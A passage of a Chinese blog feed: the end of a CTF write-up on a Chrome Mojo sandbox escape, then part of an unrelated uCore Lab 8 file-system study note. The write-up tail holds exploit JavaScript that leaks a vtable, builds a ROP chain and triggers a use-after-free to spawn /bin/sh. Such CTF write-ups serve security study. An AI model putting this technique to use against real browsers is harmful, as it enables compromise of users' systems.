&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意这里使用await，保证异步操作。因为promise回调是同步的。</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 获取返回的promiseValue</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> res = <span class="keyword">await</span> plaidStorePtrList[i].getData(<span class="string">"aaaa"</span>, <span class="number">0x100</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> data = res.data;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x28</span>; j &lt; <span class="number">0x100</span> - <span class="number">0x8</span>; j += <span class="number">0x8</span>) &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 尽管返回的是string，但仍然可以直接当作十六进制数字来使用。</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> hex = bytes2DWORD(data.slice(j, j + <span class="number">0x8</span>));</span></span><br><span class="line">                if ((hex &amp; 0xfff) == 0x7a0) &#123;</span><br><span class="line">                    PlaidStore_vtable_addr = dec2hex(hex);</span><br><span class="line">                    render_frame_host_addr = dec2hex(bytes2DWORD(data.slice(j + 0x8, j + 0x10)));</span><br><span class="line"><span class="actionscript">                    success(<span class="string">"PlaidStore vtable: "</span> + PlaidStore_vtable_addr);</span></span><br><span class="line"><span class="actionscript">                    success(<span class="string">"render_frame_host: "</span> + render_frame_host_addr);</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">break</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (PlaidStore_vtable_addr != 0)</span><br><span class="line"><span class="actionscript">                <span class="keyword">break</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        if (PlaidStore_vtable_addr == 0)</span><br><span class="line"><span class="actionscript">            <span class="keyword">throw</span> <span class="string">"PlaidStore vtable addr leak failed!"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> chromeTextBase = PlaidStore_vtable_addr - <span class="number">0x9fb67a0</span>;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"chrome Text Base: "</span> + dec2hex(chromeTextBase));</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.plaidStorePtr = plaidStorePtrList[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.chromeTextBase = chromeTextBase;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.render_frame_host_addr = render_frame_host_addr;</span></span><br><span class="line"><span class="actionscript">        success(<span class="string">"iframe loaded"</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span></span></span><br><span class="line">`;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.body.appendChild(frame);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 在frame加载完成后再异步执行其中的代码</span></span></span><br><span class="line"><span class="javascript">            frame.contentWindow.addEventListener(<span class="string">"DOMContentLoaded"</span>, <span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"parent iframe start working"</span>)</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 等待frame中的js代码执行完成</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">await</span> frame.contentWindow.pwn();</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> childPlaidStorePtr = frame.contentWindow.plaidStorePtr;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> childRenderFrameHost = <span class="built_in">parseInt</span>(frame.contentWindow.render_frame_host_addr);</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> chromeTextBase = <span class="built_in">parseInt</span>(frame.contentWindow.chromeTextBase);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 这里只要判断一个变量就知道iframe是否成功加载</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (childPlaidStorePtr == <span class="literal">undefined</span> || childPlaidStorePtr == <span class="number">0</span>)</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">throw</span> <span class="string">"Error in iframe loading"</span>;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 获取各种gadget地址</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> xchg_addr = chromeTextBase + <span class="number">0x000000000880dee8</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"xchg_addr: "</span> + dec2hex(xchg_addr));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> pop_rdi_ret = chromeTextBase + <span class="number">0x0000000002e4630f</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"pop_rdi_ret: "</span> + dec2hex(pop_rdi_ret));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> pop_rsi_ret = chromeTextBase + <span class="number">0x0000000002d278d2</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"pop_rsi_ret: "</span> + dec2hex(pop_rsi_ret));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> pop_rdx_ret = chromeTextBase + <span class="number">0x0000000002e9998e</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"pop_rdx_ret: "</span> + dec2hex(pop_rdx_ret));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> pop_rax_ret = chromeTextBase + <span class="number">0x0000000002e651dd</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"pop_rax_ret: "</span> + dec2hex(pop_rax_ret));</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> syscall_addr = chromeTextBase + <span class="number">0x0000000002ef528d</span>;</span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"syscall_addr: "</span> + dec2hex(syscall_addr));</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 预先分配0xc28</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xc28</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 将原先buffer转为int64位的数组（内存地址不变</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> uaf_buf = <span class="keyword">new</span> BigUint64Array(buf);</span></span><br><span class="line">                /* 开始布置gadgets</span><br><span class="line">                   先将对应vtable entry的前8个字节设置为childRenderFrameHost+0x10</span><br><span class="line">                   这样当crash时，$rax一定等于该值。 */</span><br><span class="line">                uaf_buf[0] = BigInt(childRenderFrameHost + 0x10);</span><br><span class="line">                uaf_buf[3] = BigInt(pop_rdi_ret);</span><br><span class="line">                uaf_buf[4] = BigInt(childRenderFrameHost + 0x10 + 0x160 + 0x8);</span><br><span class="line">                uaf_buf[5] = BigInt(pop_rsi_ret);</span><br><span class="line">                uaf_buf[6] = BigInt(0);</span><br><span class="line">                uaf_buf[7] = BigInt(pop_rdx_ret);</span><br><span class="line">                uaf_buf[8] = BigInt(0);</span><br><span class="line">                uaf_buf[9] = BigInt(pop_rax_ret);</span><br><span class="line">                uaf_buf[10] = BigInt(59);</span><br><span class="line">                uaf_buf[11] = BigInt(syscall_addr);</span><br><span class="line">                uaf_buf[(0x160 + 0x10) / 0x8] = BigInt(xchg_addr);</span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> uaf_uint8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf); <span class="comment">// /bin/sh\x00</span></span></span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 0] = 0x2f;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 1] = 0x62;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 2] = 0x69;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 3] = 0x6e;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 4] = 0x2f;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 5] = 0x73;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 6] = 0x68;</span><br><span class="line">                uaf_uint8[0x10 + 0x160 + 8 + 7] = 0x00;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">                <span class="comment">// 在parent iframe中建立PlaidStoreImpl实例</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> parentPlaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line">                Mojo.bindInterface(</span><br><span class="line">                    blink.mojom.PlaidStore.name,</span><br><span class="line">                    mojo.makeRequest(parentPlaidStorePtr).handle,</span><br><span class="line"><span class="actionscript">                    <span class="string">"context"</span>,</span></span><br><span class="line"><span class="actionscript">                    <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 释放child iframe</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.body.removeChild(frame);</span></span><br><span class="line">                frame.remove();</span><br><span class="line"><span class="actionscript">                <span class="comment">// 大量分配内存，用于占位。</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 需要注意这里的storeData的索引要变化，不然每次填充数据都只会在一块内存区域上反复填充。</span></span></span><br><span class="line"><span class="javascript">                    parentPlaidStorePtr.storeData(<span class="string">"1"</span> + i, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf));</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 尝试利用UAF漏洞来触发</span></span></span><br><span class="line"><span class="actionscript">                success(<span class="string">"get shell!"</span>);</span></span><br><span class="line"><span class="actionscript">                childPlaidStorePtr.getData(<span class="string">"aaaa"</span>, <span class="number">0x28</span>);</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">pwn()</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>执行并利用成功</p>
<p><img src="/2020/10/mojo/success.png" alt="img"></p>
]]></content>
      <categories>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>chrome</tag>
        <tag>sandbox escape</tag>
      </tags>
  </entry>
  <entry>
    <title>uCore实验 - Lab8</title>
    <url>/2020/09/uCore-8/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里是笔者在完成<code>uCore</code> Lab 8时写下的一些笔记</li>
<li>内容涉及文件系统与I/O子系统的一些相关实现。</li>
<li>内容巨多，建议使用右侧导航栏</li>
</ul>
<a id="more"></a>
<h2 id="知识点">知识点</h2>
<h3 id="1-文件系统和文件">1. 文件系统和文件</h3>
<ul>
<li>
<p><strong>文件系统是操作系统中管理持久性数据的子系统，提供数据存储和访问功能</strong></p>
<ul>
<li>组织、检索、读写访问数据</li>
<li>大多数计算机系统都有文件系统</li>
<li>Google也是一个文件系统</li>
</ul>
</li>
<li>
<p><strong>文件是具有符号名，由字节序列构成的数据项集合</strong></p>
<ul>
<li>文件系统的基本数据单位</li>
<li>文件名是文件的标识符号</li>
</ul>
</li>
<li>
<p>文件系统的功能</p>
<ul>
<li><strong>分配文件磁盘空间</strong>
<ul>
<li>管理文件块（位置和顺序）</li>
<li>管理空闲空间（位置）</li>
<li>分配算法（策略）</li>
</ul>
</li>
<li><strong>管理文件集合</strong>
<ul>
<li>定位：文件及其内容</li>
<li>命名：通过名字找到文件</li>
<li>文件系统结构：文件组织方式</li>
</ul>
</li>
<li><strong>数据可靠和安全</strong>
<ul>
<li>安全：多层次保护数据</li>
<li>可靠
<ul>
<li>持久保存文件</li>
<li>避免系统崩溃、媒体错误、攻击等</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>文件属性</p>
<ul>
<li>
<p>名称、类型、大小、位置、保护、创建者、创建时间、最近修改时间</p>
</li>
<li>
<p>文件头：文件系统元数据中的文件信息</p>
<ul>
<li>文件属性</li>
<li>文件存储位置和顺序</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-文件描述符">2. 文件描述符</h3>
<ul>
<li>
<p>打开文件和文件描述符</p>
<ul>
<li>
<p><strong>文件访问模式</strong>：进程访问文件数据前必须先“打开”文件</p>
</li>
<li>
<p><strong>内核跟踪</strong>进程打开的所有文件</p>
<ul>
<li>操作系统为每个进程维护一个打开文件表</li>
<li>文件描述符是打开文件的标识</li>
</ul>
</li>
</ul>
</li>
<li>
<p>操作系统在打开文件表中维护的打开文件状态和信息</p>
<ul>
<li><strong>文件指针</strong>
<ul>
<li>记录最近一次读写位置</li>
<li>每个进程分别维护自己已打开的文件指针</li>
</ul>
</li>
<li><strong>文件打开次数</strong>
<ul>
<li>当前打开文件的次数</li>
<li>最后一个进程关闭文件时，将其从打开文件表中移除</li>
</ul>
</li>
<li><strong>文件的磁盘信息</strong>：缓存数据访问信息</li>
<li><strong>访问权限</strong>：每个进程的文件访问模式信息</li>
</ul>
</li>
<li>
<p>文件的<strong>用户视图</strong>和<strong>系统视图</strong></p>
<ul>
<li>
<p>文件的<strong>用户视图</strong>：持久的<strong>数据结构</strong></p>
</li>
<li>
<p>系统访问接口</p>
<ul>
<li>字节序列的集合（Unix)</li>
<li>系统不关心存储在磁盘上的数据结构</li>
</ul>
</li>
<li>
<p>操作系统的<strong>文件视图</strong></p>
<ul>
<li>数据块的集合</li>
<li>数据块是逻辑运算单位，而扇区是物理存储单位</li>
<li>块大小通常来说<strong>不等于</strong>扇区大小</li>
</ul>
</li>
<li>
<p>用户视图到系统视图的转换</p>
<ul>
<li>进程读文件：获取字节所在的数据块，返回数据块对应部分</li>
<li>进程写文件：获取数据块，修改数据块中对应部分，写回数据块</li>
</ul>
<blockquote>
<p><strong>文件系统中的基本操作单位是数据块</strong>。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><strong>访问模式</strong></p>
<ul>
<li>操作系统需要了解进程如何访问文件</li>
<li><strong>顺序</strong>访问：按字节依次读取。大多数的文件访问都是顺序读取。</li>
<li><strong>随机</strong>访问：从中间读写。不常用但仍然重要，例如虚拟内存中把内存页存储在文件上</li>
<li><strong>索引</strong>访问：依据数据库特征索引。
<ul>
<li>通常操作系统不完整提供索引访问</li>
<li>数据库是建立在索引内容的磁盘访问上</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>文件内部结构</strong></p>
<ul>
<li>无结构：单词、字节序列</li>
<li>简单记录结构：分列、固定长度、可变长度</li>
<li>复杂结构：格式化的文档、可执行文件、…</li>
</ul>
</li>
<li>
<p><strong>文件共享和访问控制</strong></p>
<ul>
<li><strong>多用户</strong>系统中的文件共享相当重要</li>
<li>访问控制
<ul>
<li>每个用户能够获得哪些文件的哪些访问权限</li>
<li>访问模式：读、写、执行、删除、列表等</li>
</ul>
</li>
<li>文件访问控制列表（ACL）： &lt;文件实体，权限&gt;</li>
<li>Unix模式
<ul>
<li>&lt;用户|组|所有人，读|写|可执行&gt;</li>
<li>用户标识ID：识别用户，表明每个用户所允许的权限及保护模式</li>
<li>组标识ID：允许用户组成组，并指定组访问权限</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>语义一致性</strong></p>
<ul>
<li><strong>规定多进程如何同时访问共享文件</strong>
<ul>
<li>与同步算法类似</li>
<li>因磁盘I/O和网络延迟而设计简单</li>
</ul>
</li>
<li>Unix文件系统（UFS）语义
<ul>
<li>对所打开文件的写入内容立即对其他打开同一文件的其他用户可见</li>
<li>共享文件指针允许多用户同时读取和写入文件</li>
</ul>
</li>
<li>会话语义：写入内容只有当文件关闭时可见</li>
<li>读写锁：一些操作系统和文件系统提供该功能</li>
</ul>
</li>
</ul>
<h3 id="3-目录、文件别名和文件系统种类">3. 目录、文件别名和文件系统种类</h3>
<ul>
<li>
<p><strong>分层文件系统</strong></p>
<ul>
<li>
<p>文件以目录的方式组织起来</p>
</li>
<li>
<p><strong>目录是一类特殊的文件</strong>：目录的内容是文件索引表 <strong>&lt;文件|指向文件的指针&gt;</strong></p>
</li>
<li>
<p>目录和文件的<strong>树形结构</strong>（早期的文件系统是扁平的）</p>
<p><img src="/2020/09/uCore-8/directoryTree.png" alt="img"></p>
</li>
</ul>
</li>
<li>
<p><strong>目录操作</strong></p>
<ul>
<li>典型目录操作
<ul>
<li>搜索、创建、删除文件</li>
<li>列目录、重命名、遍历路径</li>
</ul>
</li>
<li>操作系统应该只允许内核修改目录
<ul>
<li>确保映射的完整性</li>
<li>应用程序通过系统调用访问目录</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>目录实现</strong></p>
<ul>
<li>文件名的线性列表，包含了指向数据块的指针。
<ul>
<li>编程简单</li>
<li>执行耗时。</li>
</ul>
</li>
<li>哈希表——哈希数据结构的线性表
<ul>
<li>减少目录搜索时间</li>
<li>碰撞——两个文件名的哈希值相同</li>
<li>固定大小</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>文件别名</strong></p>
<blockquote>
<p>两个或多个文件名关联同一个文件</p>
</blockquote>
<ul>
<li>
<p>硬链接：多个文件项指向一个文件</p>
</li>
<li>
<p>软链接：以“快捷方式”指向其他文件</p>
<blockquote>
<p>通过存储其真实文件的逻辑名称来实现。</p>
</blockquote>
</li>
</ul>
<p><img src="/2020/09/uCore-8/file_rename.png" alt="img"></p>
</li>
<li>
<p><strong>文件目录中的循环</strong></p>
<ul>
<li>如何保证没有循环
<ul>
<li>只允许到文件的链接，不允许在子目录的链接</li>
<li>增加链接时，用循环检测算法确定是否合理</li>
</ul>
</li>
<li>更多实践：<strong>限制路径可遍历文件目录的数量</strong></li>
</ul>
<p><img src="/2020/09/uCore-8/directoryLoop.png" alt="img"></p>
</li>
<li>
<p><strong>名字解析（路径遍历）</strong></p>
<ul>
<li>名字解析：把逻辑名字转换成物理资源（如文件）
<ul>
<li>依据路径名，在文件系统中找到实际文件位置</li>
<li>遍历文件目录直到找到目标文件</li>
</ul>
</li>
<li>举例：解析<code>/bin/sh</code>
<ul>
<li>读取根目录的文件头（在磁盘固定位置）</li>
<li>读取根目录的数据快，搜索<code>bin</code>项</li>
<li>读取<code>bin</code>的文件头</li>
<li>读取<code>bin</code>的数据块，搜索<code>ls</code>项</li>
<li>读取<code>ls</code>的文件头</li>
</ul>
</li>
<li>当前工作目录（PWD）
<ul>
<li>每个进程都会指向一个文件目录用于解析文件名</li>
<li>允许用户指定相对路径来代替绝对路径</li>
</ul>
</li>
</ul>
</li>
<li>
<p>文件系统挂载</p>
<ul>
<li>文件系统需要先挂载才能被访问</li>
<li>未挂载的文件系统被挂载在挂载点上</li>
</ul>
</li>
<li>
<p><strong>文件系统种类</strong></p>
<ul>
<li>磁盘文件系统：文件存储在数据存储设备上，如磁盘。例如：FAT, NTFS， ext2/3, ISO9660等等</li>
<li>数据库文件系统：文件特征是可被寻址的，例如WinFS</li>
<li>日志文件系统：记录文件系统的修改事件</li>
<li>特殊/虚拟文件系统</li>
<li>网络/分布式文件系统
<ul>
<li>文件可以通过网络被共享
<ul>
<li>文件位于远程服务器</li>
<li>客户端远程挂载服务器文件系统</li>
<li>标准系统文件访问被转换为成远程访问</li>
<li>标准文件共享协议：NFS for Unix, CIFS for Windows。</li>
</ul>
</li>
<li>分布式文件系统的挑战
<ul>
<li>客户端和客户端上的用户辨别起来很复杂</li>
<li><strong>一致性</strong>问题</li>
<li><strong>错误处理模式</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-虚拟文件系统">4. 虚拟文件系统</h3>
<ul>
<li>
<p>文件系统的实现：<strong>分层结构</strong></p>
<ul>
<li>虚拟（逻辑）文件系统（VFS， Virtual File System）</li>
<li>特定文件系统模块</li>
</ul>
</li>
<li>
<p><strong>虚拟文件系统（VFS）</strong></p>
<ul>
<li>目的：对所有不同文件系统的抽象</li>
<li>功能：
<ul>
<li>提供相同的文件和文件系统<strong>接口</strong></li>
<li>管理所有文件和文件系统关联的<strong>数据结构</strong></li>
<li>高效查询<strong>例程</strong>，遍历文件系统</li>
<li>与特定文件系统模块的<strong>交互</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>文件系统基本数据结构</strong></p>
<ul>
<li>文件卷控制块（Unix： <code>superblock</code>)
<ul>
<li>每个文件系统一个</li>
<li>文件系统详细信息</li>
<li>块、块大小、空余块、计数/指针等</li>
</ul>
</li>
<li>文件控制块（Unix: <code>vnode</code> or <code>inode</code>)
<ul>
<li>每个文件一个</li>
<li>文件详细信息</li>
<li>访问权限、拥有者、大小、数据块位置等</li>
</ul>
</li>
<li>目录项（Linux: <code>dentry</code>）
<ul>
<li>每个目录项一个（目录和文件）</li>
<li>将目录项数据结构及树型布局编码成树型数据结构</li>
<li>指向文件控制块、父目录、子目录等</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>文件系统的存储结构</strong></p>
<ul>
<li>文件系统数据结构：<strong>卷控制块、文件控制块、目录节点</strong></li>
<li>持久存储在外存中：存储设备的数据块中</li>
<li>当需要时加载进内存
<ul>
<li>卷控制模块：当文件系统挂载时进入内存</li>
<li>文件控制块：当文件被访问时进入内存</li>
<li>目录节点：在遍历一个文件路径时进入内存</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-文件缓存和打开文件">5. 文件缓存和打开文件</h3>
<ul>
<li>
<p>数据块缓存</p>
<ul>
<li>数据块按需读入内存
<ul>
<li>提供read()操作</li>
<li>预读：预先读取后面的数据块</li>
</ul>
</li>
<li>数据块使用后被缓存
<ul>
<li>假设数据将会再次用到</li>
<li>写操作可能被缓存和延迟写入</li>
</ul>
</li>
<li>两种数据块缓存方式
<ul>
<li>数据块缓存</li>
<li>页缓存：统一缓存数据块和内存页</li>
</ul>
</li>
</ul>
</li>
<li>
<p>页缓存</p>
<ul>
<li><strong>虚拟页式存储</strong>：在虚拟地址空间中虚拟页面可映射到本地外存文件中</li>
<li><strong>文件数据块的页缓存</strong>
<ul>
<li>在虚拟内存中文件数据块被映射成页</li>
<li>文件的读写操作被转换成对内存的访问</li>
<li>可能导致缺页或设置为脏页</li>
<li><strong>存在的问题：页置换算法需要协调虚拟存储和页缓存间的页面数</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p>文件系统中打开文件的数据结构</p>
<ul>
<li>文件描述符
<ul>
<li>每个被打开的文件都有一个文件描述符</li>
<li>文件状态信息：目录项、当前文件指针、文件操作设置等</li>
</ul>
</li>
<li>打开文件表
<ul>
<li>每个进程都有一个<strong>进程打开文件表</strong></li>
<li>一个系统级的打开文件表</li>
<li>有文件被打开时，文件卷就不能被卸载</li>
</ul>
</li>
</ul>
</li>
<li>
<p>打开文件锁</p>
<blockquote>
<p>一些文件系统提供文件锁，用于协调多进程的文件访问</p>
</blockquote>
<ul>
<li><strong>强制</strong>——根据锁保持情况和访问需求确定是否拒绝访问</li>
<li><strong>劝告</strong>——进程可以查找锁的状态来决定怎么处理</li>
</ul>
</li>
</ul>
<h3 id="6-文件分配">6. 文件分配</h3>
<ul>
<li>文件大小
<ul>
<li>大多数文件都很小
<ul>
<li>需要对小文件提供很好的支持</li>
<li>块空间不能太大</li>
</ul>
</li>
<li>一些文件非常大
<ul>
<li>必须支持大文件（64位文件偏移）</li>
<li>大文件访问需要高效</li>
</ul>
</li>
</ul>
</li>
<li>文件分配
<ul>
<li>如何表示分配给一个文件数据块的位置和顺序</li>
<li>分配方式：连续分配、链式分配、索引分配</li>
<li>指标：存储效率（外部碎片等）、读写性能（访问速度等）</li>
</ul>
</li>
</ul>
<h4 id="a-连续分配">a. 连续分配</h4>
<ul>
<li>文件头指定起始块和长度</li>
<li>分配策略：<strong>最先匹配、最佳匹配</strong></li>
<li>优点：文件读取表现好；<strong>高效的顺序和随机访问</strong></li>
<li>缺点：
<ul>
<li><strong>碎片严重！</strong></li>
<li><strong>文件大小如何增长？</strong> 预分配 ？ / 按需分配？</li>
</ul>
</li>
</ul>
<h4 id="b-链式分配">b. 链式分配</h4>
<ul>
<li>文件以数据块链表方式存储</li>
<li>文件头包含了到第一块和最后一块的指针</li>
<li>优点
<ul>
<li>创建、增大、缩小很容易</li>
<li>没有碎片</li>
</ul>
</li>
<li>缺点
<ul>
<li>无法实现真正的随机访问</li>
<li>可靠性差：破坏一个链，后面的数据块全部丢失</li>
</ul>
</li>
</ul>
<h4 id="c-索引分配">c. 索引分配</h4>
<ul>
<li>为每个文件创建一个<strong>索引数据块</strong>，该索引数据块是指向文件数据块的指针列表</li>
<li>文件头包含了索引数据块指针列表</li>
<li>优点
<ul>
<li>创建、增大、缩小很容易</li>
<li>没有碎片</li>
<li>支持直接访问</li>
</ul>
</li>
<li>缺点
<ul>
<li>当文件很小时，存储索引的开销大</li>
<li>不便于处理大文件</li>
</ul>
</li>
</ul>
<h5 id="大文件的索引分配">大文件的索引分配</h5>
<ul>
<li>使用链式索引块：将多个索引块以链表的方式串联起来</li>
<li>多级索引块：一个一级索引块指向多个二级索引块等等</li>
</ul>
<h4 id="d-UFS多级索引分配">d. UFS多级索引分配</h4>
<p><img src="/2020/09/uCore-8/UFS_indexSearch.png" alt="img"></p>
<ul>
<li>文件头包含13个指针
<ul>
<li>前10个指针指向数据块</li>
<li>第11个指针指向索引块</li>
<li>第12个指针指向二级索引块</li>
<li>第13个指针指向三级索引块</li>
</ul>
</li>
<li>效果
<ul>
<li>提高了文件大小限制阈值</li>
<li>动态分配数据块，文件扩展很容易</li>
<li>小文件开销小</li>
<li>只为大文件分配间接数据块，大文件在访问数据块时需要大量查询</li>
</ul>
</li>
</ul>
<h3 id="7-空闲空间管理">7. 空闲空间管理</h3>
<p>跟踪记录文件卷中未分配的数据块</p>
<blockquote>
<p>采用什么数据结构表示空闲空间列表？</p>
</blockquote>
<ul>
<li>位图
<ul>
<li>用位图代表空闲数据块列表
<ul>
<li><code>11111110011001001010010101</code></li>
<li>$D_i = 0$表示数据块$i$是空闲，否则表示已分配</li>
</ul>
</li>
<li>使用简单但可能会是一个大的向量表
<ul>
<li>160GB磁盘 -&gt; 40MB数据块 -&gt; 5MB位图</li>
<li>假定空闲空间在磁盘中均匀分布，则找到<code>0</code>前需要扫描<strong>磁盘数据块总数/空闲块数目</strong></li>
</ul>
</li>
</ul>
</li>
<li>链表</li>
<li>链式索引</li>
</ul>
<h3 id="8-冗余磁盘矩阵RAID">8. 冗余磁盘矩阵RAID</h3>
<h4 id="a-基本概念">a. 基本概念</h4>
<ul>
<li>
<p>磁盘分区</p>
<blockquote>
<p>通常磁盘通过分区来最大限度减小寻道时间</p>
</blockquote>
<ul>
<li>分区是一组柱面的集合</li>
<li>每个分区都可视为逻辑上独立的磁盘</li>
</ul>
<p><img src="/2020/09/uCore-8/divideArea.png" alt="img"></p>
</li>
<li>
<p>一个典型的磁盘文件系统组织</p>
<ul>
<li>
<p>文件卷：一个拥有完整文件系统实例的外存空间，通常常驻在磁盘的单个分区上</p>
</li>
<li>
<p><img src="/2020/09/uCore-8/diskFileSystem.png" alt="img"></p>
</li>
</ul>
</li>
<li>
<p>多磁盘管理</p>
<ul>
<li>使用多磁盘可改善
<ul>
<li>吞吐量（通过并行）</li>
<li>可靠性和可用性（通过冗余）</li>
</ul>
</li>
<li>冗余磁盘阵列（RAID，Redundant Array of Inexpensive disks）
<ul>
<li>多种磁盘管理技术</li>
<li>RAID分类：RAID-0、RAID-1、RAID-5</li>
</ul>
</li>
<li>冗余磁盘阵列的实现
<ul>
<li>软件：操作系统内核的文件卷管理</li>
<li>硬件：RAID硬件控制器（I/O）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="b-RAID-0：磁盘条带化">b. RAID-0：磁盘条带化</h4>
<blockquote>
<p>基于数据块的条带化</p>
</blockquote>
<p>把数据块分成多个子块，存储在独立的磁盘中</p>
<blockquote>
<p>通过独立磁盘上并行数据块访问提供更大的磁盘带宽</p>
</blockquote>
<p><img src="/2020/09/uCore-8/raid0.png" alt="img"></p>
<h4 id="c-RAID-1：磁盘镜像">c. RAID-1：磁盘镜像</h4>
<p>向两个磁盘写入，从任何一个读取</p>
<ul>
<li>可靠性成倍增加</li>
<li>读取性能线性增加</li>
</ul>
<p><img src="/2020/09/uCore-8/raid1.png" alt="img"></p>
<h4 id="d-RAID-4：带校验的磁盘条带化">d. RAID-4：带校验的磁盘条带化</h4>
<blockquote>
<p>基于数据块的条带化</p>
</blockquote>
<p>数据块级的磁盘条带化加专用奇偶校验磁盘</p>
<blockquote>
<p>允许从任意一个故障磁盘中恢复</p>
</blockquote>
<p><img src="/2020/09/uCore-8/raid4.png" alt="img"></p>
<h4 id="e-RAID-5：带分布式校验的磁盘条带化">e. RAID-5：带分布式校验的磁盘条带化</h4>
<blockquote>
<p>基于数据块的条带化</p>
</blockquote>
<p><img src="/2020/09/uCore-8/raid5.png" alt="img"></p>
<h4 id="f-可纠正多个磁盘错误的冗余磁盘阵列">f. 可纠正多个磁盘错误的冗余磁盘阵列</h4>
<ul>
<li>RAID-5：每组条带块有一个奇偶校验块，允许一个磁盘错误</li>
<li>RAID-6：每组条带块有两个冗余块，允许两个磁盘错误</li>
</ul>
<h4 id="g-RAID嵌套">g. RAID嵌套</h4>
<ul>
<li>
<p>RAID 0+1</p>
<p><img src="/2020/09/uCore-8/raid01.png" alt="img"></p>
</li>
<li>
<p>RAID 1+0</p>
